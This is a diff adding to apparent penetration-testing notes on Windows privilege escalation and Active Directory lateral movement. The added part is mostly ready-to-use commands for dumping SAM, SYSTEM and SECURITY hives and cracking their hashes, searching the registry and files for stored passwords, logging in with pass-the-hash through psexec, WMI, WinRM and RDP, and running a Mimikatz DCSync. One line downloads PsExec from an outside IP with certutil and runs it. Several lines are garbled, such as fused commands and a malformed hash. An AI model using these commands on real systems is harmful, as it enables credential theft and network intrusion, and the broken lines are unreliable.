@@ -30,6 +30,10 @@ There are several key pieces of information we should always obtain:
 > route print #  The output of this command is useful to determine possible attack vectors to other systems or networks.
 > netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
 # Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
+> netsh firewall show state
+> netsh firewall show config
+# How well patched is the system?
+> wmic qfe get Caption,Description,HotFixID,InstalledOn
 > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
 > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
@@ -38,6 +42,7 @@ There are several key pieces of information we should always obtain:
 > dir "C:\Program Files"
 > dir "C:\Program Files (x86)"
 > dir "C:\Users\lisa\Downloads"
+> dir /q # Use this instead of plain dir to see who owns
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
 > Get-Process
 > Get-Process NonStandardProcess | Select-Object Path
@@ -46,6 +51,7 @@ There are several key pieces of information we should always obtain:
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,SYSTEM,SAM,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include SYSTEM,SAM,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
@@ -291,7 +297,34 @@ Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Re
 Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystemm:
 
 ```bash
+reg save hklm\security c:\security
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+
+copy C:\sam z:\loot
+copy c:\security z:\loot
+c:\system z:\loot
+
+*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
+*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
+
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
+impacket-secretsdump Admin:'password'@$ip -outputfile hashes
+
+samdump2 SYSTEM SAM
+*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+# creddump7 - Python tool to extract credentials and secrets from Windows registry hives
+/usr/share/creddump7
+├── cachedump.py
+├── framework
+├── lsadump.py
+├── pwdump.py
+└── __pycache_
+
+./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
+Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
 This will provide hashes that you will be able to crack.
@@ -908,6 +941,14 @@ net user
 net localgroup administrators # Verify new user is created
 ```
 
+#### Get-Service
+
+If a particular file has a vulnerability and you wanna see which process it is tied to (if any), run:
+
+```bash
+get-service filename.exe
+```
+
 ### SeImpersonatePrivilege
 
 ```bash
@@ -1307,7 +1348,18 @@ From Blackfield.
 Transfer the following script.txt onto the machine:
 
 ```bash
-set verbose onX
+set verbose onXREG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 set metadata C:\Windows\Temp\meta.cabX
 set context  clientaccessibleX
 set context persistentX
@@ -1330,3 +1382,119 @@ robocopy /b E:\Windows\ntds . ntds.dit
 reg save hklm\system C:\Windows\Temp\System
 ```
 
+#### Clear Text Passwords
+
+```bash
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#Find all those strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+# Find all passwords in all files.
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+dir /s /p proof.txt
+dir /s /p local.txt
+```
+
+#### Windows Services - insecure file persmissions
+
+````bash
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
+````
+
+#### Interesting Registry Keys
+
+```bash
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+#### AD Lateral Movement
+
+##### Network
+
+```bash
+nslookup #use this tool to internally find the next computer to pivot to.
+example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
+Address: 10.11.1.121
+```
+
+###### SMB
+
+```bash
+impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
+impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
+```
+
+###### WINRM
+
+```bash
+evil-winrm -u <user> -p <password> -i 172.16.138.83
+evil-winrm -u <user> -H <hash> -i 172.16.138.83
+```
+
+###### WMI
+
+```bash
+proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
+impacket-wmiexec forest/bob:'password'@172.16.138.10
+```
+
+###### RDP
+
+```bash
+rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
+xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
+xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
+```
+
+###### Accessing shares with RDP
+
+```bash
+windows + R
+type: \\172.16.120.21
+Enter User Name
+Enter Password
+[now view shares via rdp session]
+```
+
+#### TGT Impersonation
+
+```bash
+PS> klist # should show no TGT/TGS
+PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
+PS> klist # now should show TGT/TGS
+PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
+PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
+```
+
+#### Domain Controller Synchronization
+
+To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file, which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
+
+```bash
+lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
+lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
+
+Credentials:
+  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
+    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
+    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
+...
+kali@kali: impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
+````
